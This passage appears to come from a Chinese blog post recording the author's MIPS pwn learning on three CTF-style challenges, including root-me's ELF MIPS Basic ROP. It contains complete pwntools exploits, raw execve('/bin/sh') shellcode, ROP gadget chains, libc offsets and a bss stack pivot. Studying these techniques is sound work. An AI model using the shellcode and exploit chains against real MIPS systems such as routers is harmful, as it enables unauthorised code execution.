jalr    $t9    nop    addiu   $v0, $zero, 4000 + 1    move    $a0, $zero    syscallfunction:    subu    $sp, $sp, 0x18    sw      $ra, 0x14($sp)    # write    addiu   $v0, $zero, 4000 + 4    la    $a0, 1    la    $a1, hello    la    $a2, hello_len    syscall    # read    addiu   $v0, $zero, 4000 + 3    move    $a0, $zero    move    $a1, $sp    addiu   $a2, $zero, 0x80    syscall    # write    addiu   $v0, $zero, 4000 + 4    la      $a0, 1    la      $a1, hello_start    la      $a2, hello_start_len    syscall    # write    addiu   $v0, $zero, 4000 + 4    la      $a0, 1    move    $a1, $sp    la      $a2, 20    syscall    lw      $ra, 0x14($sp)    addiu   $sp, 0x18    jr      $ra    nop.datahello:  .asciz  "Hello World\nWhat is your name: "    hello_len =    . - hellohello_start:  .asciz  "Hello "    hello_start_len =    . - hello_start</code></pre><p>题目给的保护如下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.jpg" alt></p><p>由于题目说的是MIPS，所以我们就按照大端序来编译</p><p>用如下命令进行编译</p><pre><code>mips-linux-gnu-as of.s -o of.o #编译成二进制目标文件mips-linux-gnu-ld of.o -o of #编译生成可执行文件</code></pre><p>然后我们运行一下，由于是静态编译，所以直接./of即可</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/2.jpg" alt></p><p>从汇编我们可以看到</p><pre class=" language-assembly"><code class="language-assembly">subu    $sp, $sp, 0x18sw      $ra, 0x14($sp)</code></pre><p>函数开头只将栈顶抬高了0x18个字节，并将返回地址存入sp+0x14的位置，而后面的read功能读入0x80个字节</p><pre class=" language-assembly"><code class="language-assembly"># readaddiu   $v0, $zero, 4000 + 3 #$v0保存系统调用号，read系统调用号为4003move    $a0, $zero #$a0保存第一个参数，0move    $a1, $sp #$a1保存第二个参数，栈顶指针addiu   $a2, $zero, 0x80 #$a2保存第三个参数，0x80</code></pre><p>存在很明显的栈溢出，而由于程序是由简短的汇编代码生成，所以基本上不存在可用的gadget，而由于远程没有开启<strong>ASLR</strong>，所以栈地址也不会发生变化，且程序没有<strong>NX</strong>保护，所以我们使用shellcode来进行利用</p><p>由汇编代码我们可以知道offset为0x14，我们填充0x14个垃圾字符，然后将返回值覆盖为<strong>$sp+0x14+4</strong>，即存储返回地址的位置的后四字节，然后将$sp+0x14+4的值填充为shellcode，这样返回到$ra之后就会执行shellcode</p><p>关闭本机上的aslr后动态调试，可以得到stack的地址</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/3.jpg" alt></p><p>不过在按照这个栈地址打不通，于是我动调了一下exp，发现此时的栈地址后三位为148，调试程序和调试exp时的栈地址相差0x10的大小</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/4.jpg" alt></p><p>修改之后便能打通了,最终exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span><span class="token comment" spellcheck="true"># io=process(['qemu-mips','-g','1235','./of'])</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./of'</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token number">0x76fff148</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x14</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>payload <span class="token operator">+=</span> shellcodeio<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What is your name: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/5.jpg" alt></p><p>(但不知道为什么远程就是打不通。。。)</p><h2 id="0x2-rootme-ELF-MIPS-Basic-ROP"><a href="#0x2-rootme-ELF-MIPS-Basic-ROP" class="headerlink" title="0x2.rootme-ELF MIPS - Basic ROP"></a>0x2.rootme-ELF MIPS - Basic ROP</h2><p>程序保护如下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/6.jpg" alt></p><p>连接ssh下载文件</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/7.jpg" alt>)(rootme的ssh连上去还挺好康的)</p><p>虽然题目已经告诉了保护情况，但拿到题目我还是习惯先checksec一下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/8.jpg" alt></p><p>32位大端序程序，而且之前ssh连上去之后就直接告诉我们了程序是动态编译的</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/9.jpg" alt></p><p>于是我们顺便把lib文件夹下载下来(由于ssh服务器在外网，所以我这里下载的挺慢的。。。)，文件夹中有两个文件，ld.so.1和libc.so.6</p><p>但运行起来却出了意想不到的情况</p><p>一般来说应该直接<strong>qemu-mips -L  ./  ./ch64</strong>就能运行起来，但这题却给我报了这么个错</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/10.jpg" alt></p><p>然而在ssh服务器上使用这条命令却能直接运行</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/11.jpg" alt></p><p>有点懵逼，遂谷歌报错信息，但并没有获得有用的信息，查看了一下ssh服务器上的qemu版本，为2.11.1，猜测是不是qemu版本不对，就下载了2.11.1，然而并没有什么🥚用，陷入沉思。之后又谷歌了一下，看到有类似报错的，直接使用-g进行调试，于是使用<strong>qemu-mips -L  ./ -g 1234 ./ch64</strong>启动调试，vmmap查看发现程序并未加载libc.6.so库,仅仅只加载了ld.so.1，于是便使用pwn题下加载不同libc的方法强制加载libc.so.6库</p><pre class=" language-shell"><code class="language-shell">export LD_LIBRARY_PATH=`pwd`export LD_PRELOAD=lib/libc.so.6</code></pre><p>然后运行</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/12.jpg" alt></p><p>成功！第一行的报错个人猜测是我强制加载了libc库，然后-L 又指定了一下libc，然后报错，当然这只是猜测，也懒得谷歌了</p><p>接下来就开始利用</p><p>首先将程序分别用IDA和Ghidra进行加载，用ghidra查看伪代码,main函数如下</p><pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  byte bStack144<span class="token punctuation">;</span>  <span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  bStack144 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_stdout<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess denied.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter your passphrase: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token string">"$MyPasswordPoorlySecured!"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    bStack144 <span class="token operator">=</span> bStack144 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess granted!.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>分析main函数，我们有三次输入的机会，存在明显的栈溢出</p><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>fgets接受0x200个字节的输入，而缓冲区大小只有128字节，当输入为<strong>$MyPasswordPoorlySecured!</strong>时就退出while循环</p><p>我们动态调试一下来确定偏移量，使用cyclic 200生成200个字符，然后输入进去</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/14.jpg" alt></p><p>程序崩溃，然后确定偏移量</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/15.jpg" alt></p><p>offset=132,我们再来验证一下，我们使用cyclic生成132个字符再加上BBBB</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/16.jpg" alt></p><p>可以看到，返回地址确实被覆盖成了BBBB</p><p>确定了返回地址，该怎么利用</p><p>由于远程环境未开启ASLR且程序未开启PIE，所以libc加载地址是不变的，我们无需泄露libc地址，直接vmmap查看libc加载地址即可</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/17.jpg" alt></p><p>可以查看到libc基地址为<strong>0x76637000</strong></p><p>然后我们要构造出system(‘/bin/sh’),有了libc基地址，system和binsh字符串的地址也知道了，接下来查找gadget，IDA加载libc.so.6，使用<strong>mipsrop.stackfinder()</strong>命令查找用于栈的gadgets</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/18.jpg" alt></p><p>我们需要控制$a0，用于存放binsh的地址，我们选择<strong>0x0012BAA4</strong>位置处的gadget来操作，如下</p><pre class=" language-assembly"><code class="language-assembly">.text:0012BAA4                 move    $t9, $s0.text:0012BAA8                 jalr    $t9 ; pipe.text:0012BAAC                 addiu   $a0, $sp, 0x24  # '$'</code></pre><p>这一处gadget会将<strong>$sp+0x24</strong>处的值作为<strong>$a0</strong>的值，所以<strong>$sp+0x24</strong>处我们要填上binsh的地址，然后会跳转到$s0寄存器指向的地址处，所以<strong>$s0</strong>我们要设置为system函数的地址，为了方便说明，我们称这个gadget为<strong>gadget_a0</strong></p><p>要完成<strong>gadget_a0</strong>，我们需要先设置好$s0寄存器的值，uclibc中有一个类似于x86-64架构下的通用gadget，可以设置我们要用到的绝大多数的寄存器的值，<strong>位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong>，如下所示</p><pre class=" language-assembly"><code class="language-assembly">.text:000AE818                 lw      $ra, 0x40+var_4($sp).text:000AE81C                 move    $v0, $s6.text:000AE820                 lw      $s7, 0x40+var_8($sp).text:000AE824                 lw      $s6, 0x40+var_C($sp).text:000AE828                 lw      $s5, 0x40+var_10($sp).text:000AE82C                 lw      $s4, 0x40+var_14($sp).text:000AE830                 lw      $s3, 0x40+var_18($sp).text:000AE834                 lw      $s2, 0x40+var_1C($sp).text:000AE838                 lw      $s1, 0x40+var_20($sp).text:000AE83C                 lw      $s0, 0x40+var_24($sp).text:000AE840                 jr      $ra.text:000AE844                 addiu   $sp, 0x40</code></pre><p>利用这个gadget，我们可以将$s0设置为system函数的地址，将这个gadget执行完后的返回值设置为gadget_a0的地址，即在<strong>$sp+0x3c</strong>的位置处填入gadget_a0的地址，类似的我们称这个gadget为<strong>gadget_s0</strong></p><p>于是，我们整个payload的结构图如下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.png" alt></p><p>详细地解释一下这个流程，首先偏移量132，随后将返回地址覆盖为gadget_s0，然后由于这一句</p><pre class=" language-assembly"><code class="language-assembly">lw      $s0, 0x40+var_24($sp)</code></pre><p>将0x1c($sp)位置处的值写入$s0，所以$sp+0x1c处我们填充为system地址，而由于当程序执行gadget_s0时，gadget_s0就是sp所指向的位置，所以直接填充0x1c个垃圾字符后接上system地址即可，由于返回地址为</p><pre class=" language-assembly"><code class="language-assembly">lw      $ra, 0x40+var_4($sp)</code></pre><p>即相对于返回地址位置+0x3c处要填充为gadget_a0的地址，‘A’*0X1C+system(4字节)=0x20字节，所以在system后再填充(0x3c-0x20)个字节的垃圾字符，然后再填充gadget_a0的地址，再填充0x24个垃圾字节，最后写入binsh的地址</p><p>不过这样子的exp写完会有点问题，发生在执行system(“/bin/sh”)的时候，如下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/21.jpg" alt></p><p>也不想调试到底是哪里发生了问题，作为替代，我将binsh的地址直接替换为sh\x00\x00，然后就可以打通了，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-mips'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'./'</span><span class="token punctuation">,</span> <span class="token string">'./ch64'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process(['qemu-mips', '-L', './', '-g', '1234', './ch64'])</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'lib/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token number">0x76637000</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x00164fac</span>gadget_a0 <span class="token operator">=</span> <span class="token number">0x0012BAA4</span><span class="token operator">+</span>libc_basegadget_s0 <span class="token operator">=</span> <span class="token number">0x000AE818</span><span class="token operator">+</span>libc_baselog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_a0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_s0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''payload = 'A'*0x40payload += p32(0x409010)payload += 'A'*0x40'''</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">132</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x24</span>payload <span class="token operator">+=</span> <span class="token string">'sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$MyPasswordPoorlySecured!'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/22.jpg" alt></p><h2 id="0x3-xmctf-top-mipspwn"><a href="#0x3-xmctf-top-mipspwn" class="headerlink" title="0x3.xmctf.top-mipspwn"></a>0x3.xmctf.top-mipspwn</h2><p>下载下来有两个libc文件和一个可执行文件，checksec检查一下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/23.jpg" alt></p><p>32位小端序，无保护</p><p>file一下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/24.jpg" alt></p><p>静态编译，所以这个lib文件夹并没有什么用</p><p>分别用ghidra和IDA加载题目，ghidra查看伪代码</p><p>main函数和漏洞函数分别如下</p><pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span>EVP_PKEY_CTX <span class="token operator">*</span>param_1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c">undefined4 <span class="token function">vul</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  undefined auStack64 <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"just do it~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>auStack64<span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c</code></pre><p>read读入的字节数大于缓冲区的大小，造成溢出</p><p>注意到存在一个<strong>backdoor</strong>函数，查看一下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"how are you?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>并没有什么🥚用，只是提供了一个system函数</p><p>IDA使用mipsrop查找一下gadget</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/27.jpg" alt></p><p>虽然是静态编译，但可用的gadget非常少</p><p>而用于栈的gadget只有一条，还是为$a1赋值</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/28.jpg" alt></p><p>所以我们得换个思路，gadget不足，不能用rop来getshell，但程序没有NX保护，所以我们便采用ret2shellcode来利用</p><p>首先确定一下偏移量大小</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/29.jpg" alt></p><p>glibcpwn中，ret2shellcode有时会利用read函数往bss端读入shellcode然后跳转到bss段执行，这题的利用手法也类似，不过在这题中，我们并不能手动构造出read函数，而是借用vul函数中的read语句来执行，如下所示</p><pre class=" language-assembly"><code class="language-assembly">.text:00400484                 li      $a2, 0xB0.text:00400488                 addiu   $v0, $fp, 0x58+var_40.text:0040048C                 move    $a1, $v0.text:00400490                 move    $a0, $zero.text:00400494                 la      $v0, read.text:00400498                 move    $t9, $v0.text:0040049C                 bal     read</code></pre><p>注意到read函数的第二个参数，也就是读入的地址来源于$v0,而$v0又来源于$fp+0x58-0x40，继续往下看到vul函数结束的语句</p><pre class=" language-assembly"><code class="language-assembly">.text:004004B0                 lw      $ra, 0x58+var_4($sp).text:004004B4                 lw      $fp, 0x58+var_8($sp).text:004004B8                 addiu   $sp, 0x58.text:004004BC                 jr      $ra</code></pre><p>vul函数结束时会还原栈帧，main函数的$fp的值会存在$ra的上方，函数结束时会将其取出放入$fp中，因此我们可以控制$fp的值，再将$ra覆盖为read功能开始处，也就是0x00400484，这样我们就能将shellcode写入别的位置，再将返回地址覆盖为shellcode写入的位置，返回后就会执行shellcode</p><p>先贴上exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span><span class="token comment" spellcheck="true">#io = process(['./qemu-mipsel', '-g','1234', './pwn2'])</span><span class="token comment" spellcheck="true">#io=remote('xmctf.top',8905)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"what is your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'just do it~'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#shellcode = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span><span class="token comment" spellcheck="true">#shellcode = "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00"</span>shellcode<span class="token operator">=</span><span class="token string">"\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh"</span> bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read <span class="token operator">=</span> <span class="token number">0x400484</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">56</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">0x58</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">60</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> shellcodeio<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>由于偏移量为60，那么相对于fp就为56，我们的目标是往bss段写入shellcode，为避免bss开头存在某些值，选择往bss+0x50处写入shellcode</p><pre class=" language-assembly"><code class="language-assembly">addiu   $v0, $fp, 0x58+var_40</code></pre><p>因为是将<strong>$fp+0x58-0x40</strong>赋给$v0,为避免计算，我们将$fp设置为<strong>bss+0x50-0x58+0x40</strong>,这样赋给$v0的就是<strong>(bss+0x50-0x58+0x40)+0x58-0x40=bss+0x50</strong>，随后sleep(1),等待rop执行，接着就会执行第二次read，往bss+0x50读，实际上这就是一个栈迁移，将栈迁移到了bss段，这次就只需要覆盖$ra，将$ra修改为shellcode的地址。第二次read从bss+0x50开始，然后写入60(0x3c)个A，返回地址占四字节，加起来就是0x40个字节，返回地址之后就是shellcode，所以将返回地址修改为<strong>bss+0x50+0x40</strong>就好</p><p>执行效果如下</p><p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/30.jpg" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        这三道题相信在做多了glibcpwn的师傅们看来都是基础题，需要注意的就是mips架构下的指令和寄存器的功能，以及叶子函数和非叶子函数的一点区别。不过在跟着《解密家用路由器0day漏洞挖掘技术》这本书进行一些路由器漏洞的复现时，发觉挺多路由器漏洞的利用难度也差不多是这个水平(当然也不能局限于这个难度，难题也还是有的)，路由器绝大部分无aslr，固件无保护，困难之处在于发现漏洞。当然也可能是因为我接触的少了，这本书上的几个漏洞也都是好几年前的了，现在的情况也应该有所变化。</p><p>​        最后，希望本篇文章能为像我一样刚入门的师傅们提供一点帮助。</p><p>参考链接：</p><ul><li><a href="https://www.root-me.org/en/Challenges/App-System/" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/App-System/</a></li><li><a href="https://www.cnblogs.com/hac425/p/9416864.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416864.html</a></li><li><a href="https://blog.csdn.net/seaaseesa/article/details/105281585" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105281585</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();    